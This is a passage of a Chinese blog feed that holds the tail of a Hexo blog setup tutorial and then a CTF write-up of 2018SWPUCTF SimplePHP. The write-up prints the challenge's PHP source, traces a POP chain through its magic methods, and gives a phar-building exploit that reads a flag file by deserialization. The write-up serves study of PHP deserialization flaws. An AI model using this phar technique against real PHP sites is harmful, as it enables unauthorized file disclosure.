class="line"><span class="attr">per_page:</span> <span class="number">10</span><span class="comment"># 每页显示的文章量 (0 = 关闭分页功能)</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span><span class="comment"># 分页目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include / Exclude file(s)</span></span><br><span class="line"><span class="comment"># 举例如下图</span></span><br><span class="line"><span class="attr">include:</span><span class="comment"># Hexo 默认会忽略隐藏文件和文件夹（包括名称以下划线和 . 开头的文件和文件夹，Hexo 的 _posts 和 _data 等目录除外）。通过设置此字段将使 Hexo 处理他们并将它们复制到 source 目录下。</span></span><br><span class="line"><span class="attr">exclude:</span><span class="comment"># Hexo 会忽略这些文件和目录</span></span><br><span class="line"><span class="attr">ignore:</span><span class="comment"># 忽略文件/文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">TKL</span><span class="comment"># 更换主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span><span class="comment"># 服务器部署配置</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">''</span></span><br></pre></td></tr></table></figure><p><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-2-2-1.png"></p><h4 id="3-2-3-Hexo的基本操作"><a href="#3-2-3-Hexo的基本操作" class="headerlink" title="3.2.3 Hexo的基本操作"></a>3.2.3 Hexo的基本操作</h4><ol><li><p>init</p><ul><li><code>hexo init [folder]</code></li><li>初始化命令，新建一个网站。如果没有设置[folder]，则会在当前文件夹创建</li></ul></li><li><p>new</p><ul><li><code>hexo new [layout] &lt;title&gt;</code></li><li>创建一篇新的文章，如果没有设置[layout]，则将会按照上面提到的_config.yml文件中的default_layout进行代替。</li><li><code>&lt;title&gt;</code>位置放置标题，如果标题中含有空格，则需要将标题使用引号括起来。</li><li><table><thead><tr><th align="center">参数</th><th align="left">参数全称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">-p</td><td align="left">–path</td><td align="left">自定义新文章的路径</td></tr><tr><td align="center">-r</td><td align="left">–replace</td><td align="left">如果存在同名文章，将其替换</td></tr><tr><td align="center">-s</td><td align="left">–slug</td><td align="left">文章的 Slug，作为新文章的文件名和发布后的 URL</td></tr></tbody></table></li></ul></li><li><p>generate</p><ul><li><code>hexo generate</code>|<code>hexo g</code></li><li>生成静态文件</li><li><table><thead><tr><th align="center">参数</th><th align="left">参数全称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">-d</td><td align="left">–deploy</td><td align="left">文件生成后立即部署网站</td></tr><tr><td align="center">-w</td><td align="left">–watch</td><td align="left">监视文件变动</td></tr><tr><td align="center">-b</td><td align="left">–bail</td><td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td align="center">-f</td><td align="left">–force</td><td align="left">强制重新生成文件，Hexo 引入了差分机制，如果 public 目录存在，那么 hexo g 只会重新生成改动的文件。使用该参数的效果接近 hexo clean &amp;&amp; hexo generate</td></tr><tr><td align="center">-c</td><td align="left">–concurrency</td><td align="left">最大同时生成文件的数量，默认无限制</td></tr></tbody></table></li></ul></li><li><p>publish</p><ul><li><code>hexo publish [layout] &lt;filename&gt;</code></li><li>发表草稿。</li></ul></li><li><p>server</p><ul><li><code>hexo server</code>|<code>hexo s</code></li><li>启动本地服务器，默认情况下，开启后可直接访问<a href="http://localhost:4000/查看运行情况" target="_blank" rel="noopener">http://localhost:4000/查看运行情况</a></li><li><table><thead><tr><th align="center">参数</th><th align="left">参数全称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">-p</td><td align="left">–port</td><td align="left">重设端口</td></tr><tr><td align="center">-s</td><td align="left">–static</td><td align="left">只使用静态文件</td></tr><tr><td align="center">-l</td><td align="left">–log</td><td align="left">启动日记记录，使用覆盖记录格式</td></tr></tbody></table></li></ul></li><li><p>deploy</p><ul><li><code>hexo deploy</code>|<code>hexo d</code></li><li><table><thead><tr><th align="center">参数</th><th align="left">参数全称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">-g</td><td align="left">–generate</td><td align="left">将之前部署好的生成静态文件</td></tr></tbody></table></li></ul></li><li><p>clean</p><ul><li><code>hexo clean</code></li><li>清除缓存文件 (db.json) 和已生成的静态文件 (public)。在某些情况（尤其是更换主题后），如果发现站点的更改无论如何也不生效，就可能需要运行该命令。<h3 id="3-3-添加基础功能"><a href="#3-3-添加基础功能" class="headerlink" title="3.3 添加基础功能"></a>3.3 添加基础功能</h3></li></ul></li><li><p>评论</p><ul><li>要选定一个合适的评论系统，一般来说有多说，网易云跟帖，畅言，来必力（LiveRe），Disqus，Hypercomments，valine，Giteement。</li><li>首先，多说和网易云已经不能使用了，其次，畅言需要备案，Disqus，Hypercomments和LiveRe都是国外的系统，加载速度会非常慢，甚至有访问不了的可能，所以在找了很久后，决定使用Giteement，这个对国内用户来讲相对来说要快一点。</li><li>使用码云的issues作为评论系统，就要使用码云来登录评论，所以需要在码云上配置第三方应用。</li><li>进入码云，按照相应教程，配置好第三方应用后，拿到其对应的url和对应token，就可以在本地主题中的配置文件（/themes/）里面添加好相应的属性，即可开启评论系统</li><li><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-3-1.png"></li></ul></li><li><p>流量统计</p><ul><li>一般是使用不蒜子进行流量的统计，只需要在对应的themes\yilia-plus_config.yml中开启该功能即可</li><li><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-3-2.png"></li></ul></li><li><p>字数统计</p><ul><li>使用hexo-wordcount来进行字数统计，在对应的themes\yilia-plus_config.yml中开启该功能即可</li><li><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-3-3.png"></li></ul></li><li><p>还有更多不同的插件等效果，各个主题都有其不同的实现方式，将不一一列举。</p></li></ol><h3 id="3-4-部署到个人服务器"><a href="#3-4-部署到个人服务器" class="headerlink" title="3.4 部署到个人服务器"></a>3.4 部署到个人服务器</h3><ol><li>当一切都调试好后，可以开始配置上传服务器的操作。从上述的命令操作可以知道，上传的操作是hexo d。而之所以可以一键上传，是因为在主配置文件中添加了如下图内容：<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-4-1.png"></li><li>上传类型为git，上传的位置为之前配置好的私人git服务器，如果是放在github或者码云等平台，则此处对应的就是你的代码仓库的链接。上传分支为主分支master。</li><li>当配置好这些后，就可以在博客根目录下，打开命令提示符，输入‘hexo clean &amp;&amp; hexo g &amp;&amp; hexo d’来进行上传。</li><li>此命令代表首先清除该目录下之前生成db.json文件，然后再重新生成静态文件db.json，然后部署网站<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-4-2.png"></li></ol><h3 id="3-5-学习markdown，更新博文"><a href="#3-5-学习markdown，更新博文" class="headerlink" title="3.5 学习markdown，更新博文"></a>3.5 学习markdown，更新博文</h3><ol><li>当一切都部署完成后，便可以开始写博客了。Hexo中的博客在文件生成的时候便是直接生成为一个md文件，所以在写博客之前，还需要学习一下markdown的语法</li><li>Markdown是一种可以使用普通的文本编辑器进行编写的标记语言，可以通过简单的标记语法，使普通的文本内容具有一定的格式。</li><li>具体格式如下图<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-5-1.png"><img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-5-2.png"></li><li>掌握格式后慢慢熟练，便可以写出格式整洁好看的博文。<img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/h3-5-3.png"></li></ol><h3 id="3-6-搜索引擎收录"><a href="#3-6-搜索引擎收录" class="headerlink" title="3.6 搜索引擎收录"></a>3.6 搜索引擎收录</h3><ol><li>当更新完博文之后，尤其是技术博文，总是希望可以帮助到更多遇到该问题，或者说想要学习该技术的人，所以说这个时候，如果你的博文可以被别人搜索到，则可以帮助到别人。但是搜索引擎收录并不是说创建好这个网站后便能及时的收录到的，还需要个人站长去向各大搜索引擎去提交自己的网站信息</li><li>在此处提供一些搜索引擎收录目录<table><thead><tr><th align="center">网站名称</th><th align="left">提交入口</th></tr></thead><tbody><tr><td align="center">百度</td><td align="left"><a href="https://ziyuan.baidu.com/linksubmit/url" target="_blank" rel="noopener">https://ziyuan.baidu.com/linksubmit/url</a></td></tr><tr><td align="center">360</td><td align="left"><a href="http://www.soshoulu.com/sousuotijiao/360/tijiao/index.htm" target="_blank" rel="noopener">http://www.soshoulu.com/sousuotijiao/360/tijiao/index.htm</a></td></tr><tr><td align="center">谷歌</td><td align="left"><a href="http://www.google.cn/intl/zh-CN/add_url.html" target="_blank" rel="noopener">http://www.google.cn/intl/zh-CN/add_url.html</a></td></tr><tr><td align="center">搜搜</td><td align="left"><a href="http://fankui.help.sogou.com/index.php/web/web/index?type=1" target="_blank" rel="noopener">http://fankui.help.sogou.com/index.php/web/web/index?type=1</a></td></tr><tr><td align="center">必应</td><td align="left"><a href="https://blogs.bing.com/webmaster/september-2018/Anonymous-URL-Submission-Tool-Being-Retired" target="_blank" rel="noopener">https://blogs.bing.com/webmaster/september-2018/Anonymous-URL-Submission-Tool-Being-Retired</a></td></tr></tbody></table></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-Hexo介绍&quot;&gt;&lt;a href=&quot;#1-Hexo介绍&quot; class=&quot;headerlink&quot; title=&quot;1. Hexo介绍&quot;&gt;&lt;/a&gt;1. Hexo介绍&lt;/h2&gt;&lt;p&gt;Hexo是一个快速, 简洁且高效的个人博客框架。 可以让上百个页面在几秒内瞬间完成渲染。
      
    
    </summary>
    
    
      <category term="技巧总结" scheme="www.jarvis-cy.com/categories/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="博客" scheme="www.jarvis-cy.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="Hexo" scheme="www.jarvis-cy.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化实例</title>
    <link href="www.jarvis-cy.com/2020/04/14/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B/"/>
    <id>www.jarvis-cy.com/2020/04/14/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B/</id>
    <published>2020-04-14T08:31:20.000Z</published>
    <updated>2020-04-14T08:34:55.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018SWPUCTF-SimplePHP"><a href="#2018SWPUCTF-SimplePHP" class="headerlink" title="2018SWPUCTF-SimplePHP"></a>2018SWPUCTF-SimplePHP</h2><h5 id="1-源码："><a href="#1-源码：" class="headerlink" title="1. 源码："></a>1. 源码：</h5><ul><li>file.php:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>class.php:<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $test;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $str;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;str = $name;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $source;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $str;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;source = $file;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $content;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;$key = $value;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $params;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span></span><br><span class="line"><span class="php">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $value = <span class="string">"index.php"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $text = base64_encode(file_get_contents($value));</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $text;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><h5 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2. 解题思路"></a>2. 解题思路</h5><ol><li><p>拿到题目后首先通过第1个文件得到class.php<br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-1.png"></p></li><li><p>然后看到class.php后，会很明显的意识到这是一个phar反序列化。先通篇浏览下来之后，发现这个文件中一共有三个类。然后根据file.php的内容，我们首先将目光锁定到show这个类上</p></li><li><p>看到在file.php中调用的那个方法<br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-2.png"><br> 然后会发现他已经将该变量中的一些敏感词汇进行了过滤，然后就可以注意到其中一个f1ag关键词,于是这个方法我们暂时不能使用，但由此也可以得到一个信息，就是我们所需要的内容存在于这个<code>f1ag</code>当中</p></li><li><p>然后我们顺着视线继续往下看，看到第3个类。不难发现，在第3个类中就有我们可以利用的函数file_get<br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-3.png"><br> 所以我们此时的目的就是将该函数中的value这个值设定为我们所需要的文件，然后将这个文件的base64加密后的结果输出</p></li><li><p>第1步我们已经找到了我们所需要利用的函数，然后开始倒着往上推，这个参数是从哪里来的<br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-4.png"><br> 可以看到是由get这个函数的返回值调用了我们所需要的这个函数，而他在调用的时候，中间所传递的参数又是params得来的，而这个key，是由魔术函数<code>__get()</code>得来的。</p></li><li><p>我们知道魔术函数<code>__get()</code>是，当外界在想调用一个不存在的参数的时候，会被自动执行的一个函数，而这个key代表的就是当时调用这个不存在的参数的参数名</p><ul><li>例如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">         <span class="keyword">echo</span> $key . <span class="string">" 不存在"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">$t = <span class="keyword">new</span> Test(); </span><br><span class="line"><span class="keyword">echo</span> $t-&gt;name;</span><br></pre></td></tr></table></figure>就会输出：<code>name 不存在</code><br>于是到此这个类中的内容就利用完毕了</li></ul></li><li><p>现在开始想如何能跳转到这个类，于是我们接着往上找，看到了show这个类中有一个魔术函数<code>__tostring()</code><br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-5.png"><br> 这个函数是在当有人想要输出这个类的时候会被自动调用<br> 也就是说，如果我们把这个函数中的<code>str[&#39;str&#39;]</code>指定为test类创建的对象，我们会发现在这个魔术函数中它所指定的source参数对应的新创建的test对象里面并没有该参数，那么就会触发test类中的<code>__get()</code>魔术函数。</p></li><li><p>所以说我们就可以提前给test类创建的对象中的params数组的source键，赋值为我们所需要的文件</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br></pre></td></tr></table></figure><p> 这样只要有输出show，这个类的动作便可以实现，对这个文件的读取</p></li><li><p>而读取的这个动作就在C1e4r类中<br> <img src="/img/loading.gif" alt="Alt text" class="lazyload" data-src="/images/pt-6.png"><br> 我们只需要把show这个类进行实例化，然后赋值给C1e4r类中的<code>$str</code>即可。</p></li><li><p>根据上述的步骤，我们将内容生成为phar文件，上传进行触发，从而得到flag<br>exp：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> Test();</span></span><br><span class="line"><span class="php">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span></span><br><span class="line"><span class="php">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span></span><br><span class="line"><span class="php">$b-&gt;str[<span class="string">'str'</span>] = $a;</span></span><br><span class="line"><span class="php">$c= <span class="keyword">new</span> C1e4r($b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($c);</span></span><br><span class="line"><span class="php">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($obj);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>)</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018SWPUCTF-SimplePHP&quot;&gt;&lt;a href=&quot;#2018SWPUCTF-SimplePHP&quot; class=&quot;headerlink&quot; title=&quot;2018SWPUCTF-SimplePHP&quot;&gt;&lt;/a&gt;2018SWPUCTF-SimplePHP&lt;/
      
    
    </summary>
    
    
      <category term="例题分析" scheme="www.jarvis-cy.com/categories/%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/"/>
    
    
      <category term="PHP" scheme="www.jarvis-cy.com/tags/PHP/"/>
    
      <category term="反序列化" scheme="www.jarvis-cy.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="phar" scheme="www.jarvis-cy.com/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>Phar与Stream Wrapper造成的反序列化漏洞原理</title>
    <link href="www.jarvis-cy.com/2020/04/11/Phar%E4%B8%8EStream-Wrapper%E9%80%A0%E6%88%90%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>www.jarvis-cy.com/2020/04/11/Phar%E4%B8%8EStream-Wrapper%E9%80%A0%E6%88%90%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2020-04-11T14:40:17.000Z</published>
    <updated>2020-04-11T14:53:21.899Z</updated>
    
